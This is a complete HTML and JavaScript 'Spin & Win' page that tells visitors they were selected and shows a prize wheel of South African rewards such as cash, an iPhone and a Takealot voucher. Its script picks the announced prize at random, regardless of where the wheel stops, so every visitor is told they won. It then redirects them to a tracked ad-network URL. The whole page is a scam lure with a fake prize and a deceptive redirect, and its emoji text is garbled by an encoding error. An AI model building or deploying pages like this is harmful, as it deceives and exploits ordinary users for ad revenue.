<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Lucky Spin Wheel</title>
<style>
body {
  background:#1E1F29;
  font-family: Arial, sans-serif;
  text-align:center;
  color:#fff;
  margin:0;
}
h1 {color:#FFD700;margin-top:30px;}
p {color:#ffffffb0;}
#wheelContainer {
  position:relative;
  width:320px;
  height:320px;
  margin:40px auto;
}
canvas {
  border-radius:50%;
  border:10px solid #FFD700;
}
#pointer {
  width:0;
  height:0;
  border-left:20px solid transparent;
  border-right:20px solid transparent;
  border-bottom:30px solid #FFD700;
  position:absolute;
  top:-30px;
  left:50%;
  transform:translateX(-50%);
}
#spinBtn {
  background:#00FF9D;
  border:none;
  padding:15px 40px;
  font-size:20px;
  font-weight:bold;
  border-radius:10px;
  cursor:pointer;
  margin-top:20px;
}
#spinBtn:hover {background:#00e286;}
#result {
  font-size:22px;
  margin-top:20px;
  color:#FFD700;
  display:none;
}
</style>
</head>
<body>

<h1>ðŸŽ‰ Spin & Win</h1>
<p>You have been selected to spin the Lucky Wheel!</p>

<div id="wheelContainer">
  <div id="pointer"></div>
  <canvas id="wheel" width="320" height="320"></canvas>
</div>

<button id="spinBtn">SPIN NOW</button>
<div id="result"></div>

<script>
const wheel = document.getElementById("wheel");
const ctx = wheel.getContext("2d");
const result = document.getElementById("result");
const spinBtn = document.getElementById("spinBtn");

const prizes = ["R1000 Cash","iPhone","Takealot Voucher","Free Data","R500","Bonus"];
const colors = ["#FF3D00","#00D1FF","#FFD700","#28a745","#9b59b6","#e67e22"];
const arc = Math.PI * 2 / prizes.length;
let isSpinning = false;

function drawWheel(){
  for(let i=0;i<prizes.length;i++){
    ctx.beginPath();
    ctx.fillStyle = colors[i];
    ctx.moveTo(160,160);
    ctx.arc(160,160,150,arc*i,arc*(i+1));
    ctx.fill();
    ctx.save();
    ctx.translate(160,160);
    ctx.rotate(arc*i + arc/2);
    ctx.fillStyle="#fff";
    ctx.font="bold 14px Arial";
    ctx.fillText(prizes[i],60,5);
    ctx.restore();
  }
}
drawWheel();

spinBtn.onclick = ()=>{
  if(isSpinning) return;
  isSpinning=true;

  let deg = Math.floor(Math.random()*3000)+3000;
  wheel.style.transition="transform 5s ease-out";
  wheel.style.transform="rotate("+deg+"deg)";

  setTimeout(()=>{
    const win = prizes[Math.floor(Math.random()*prizes.length)];
    result.style.display="block";
    result.innerHTML="ðŸŽ You won "+win+"!";
    setTimeout(()=>{
      window.location.href="https://max.bountyads.store/?utm_medium=f00e2c6f9f959bfb01f628e64f8c13122d7ceb87&utm_campaign=target_ZA_9ac614";
    },2000);
  },5000);
};
</script>

</body>
</html>
